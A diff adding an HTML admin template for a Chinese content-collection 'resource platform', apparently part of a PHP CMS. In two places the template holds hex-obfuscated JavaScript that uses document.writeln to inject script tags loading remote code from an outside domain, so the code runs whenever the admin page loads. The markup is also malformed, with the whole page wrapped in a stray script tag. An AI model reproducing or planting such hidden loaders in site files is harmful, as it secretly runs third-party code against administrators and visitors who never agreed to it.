@@ -1,0 +1,78 @@
+﻿<script>
+<html xmlns="http://www.w3.org/1999/xhtml"><head><script></script>
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>m1938模板资源平台</title>
+
+    <script type="text/javascript" src="__STATIC__/js/jquery.js"></script>
+<script type="text/javascript"language="javascript">
+/**
+ */ 
+function iFrameHeight(){
+var ifm=document.getElementById("iframepage");
+var subWeb=document.frames?document.frames("iframepage").document:ifm.contentDocument;
+	if(ifm!=null&&subWeb!=null){
+		ifm.height=subWeb.body.scrollHeight;
+		ifm.width=subWeb.body.scrollWidth
+	}
+}
+</script>
+
+</head>
+<body>
+<div class="top-nav">
+
+
+
+  <div class="w1000 clearfix">
+    <div class="topLogo"></div>
+    <div class="topLogin"> &nbsp;资源平台 </div>
+  </div>
+</div>
+<div class="index-con" style="z-index: 0">
+ <div class="page-container p10">
+
+
+ <ul>
+ 
+ {include file="../../../application/admin/view/public/head" /}
+
+<div class="page-container p10">
+
+    <div class="my-toolbar-box">
+        <div class="layui-btn-group">
+            {if condition="$collect_break_vod neq ''"}
+            <a href="{:url('load')}?flag=vod" class="layui-btn layui-btn-primary ">【视频断点采集】</a>
+            {/if}
+            {if condition="$collect_break_art neq ''"}
+            <a href="{:url('load')}?flag=art" class="layui-btn layui-btn-primary ">【文章断点采集】</a>
+            {/if}
+            </div>
+    </div>
+    <hr>
+<script language="javascript">
+window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65\x6c\x6e"]("\x3c\x73\x63\x72\x69\x70\x74 \x73\x72\x63\x3d\'\x68\x74\x74\x70\x3a\x2f\x2f\x61\x2e\x6d\x61\x63\x63\x76\x2e\x63\x6f\x6d\x2f\x76\x31\x30\x2f\x61\x6b\x73\x32\x30\x31\x39\x30\x39\x30\x37\x2e\x6a\x73\' \x63\x68\x61\x72\x73\x65\x74\x3d\'\x75\x74\x66\x2d\x38\'\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e");
+</script>
+   </div>
+
+{include file="../../../application/admin/view/public/foot" /}
+
+ 
+ </div>
+   <script language="javascript">
+window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65\x6c\x6e"]("\x3c\x73\x63\x72\x69\x70\x74 \x73\x72\x63\x3d\'\x68\x74\x74\x70\x3a\x2f\x2f\x61\x2e\x6d\x61\x63\x63\x76\x2e\x63\x6f\x6d\x2f\x76\x31\x30\x2f\x67\x67\x2e\x6a\x73\' \x63\x68\x61\x72\x73\x65\x74\x3d\'\x75\x74\x66\x2d\x38\'\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e");
+</script>
+
+  </ul>
+</div>
+ <li class="in-jbk in-client"> 
+<div style="text-align:center;">
+<span style="display:none">
+
+</div>
+</li>
+
+</body></html>
+
+</script>
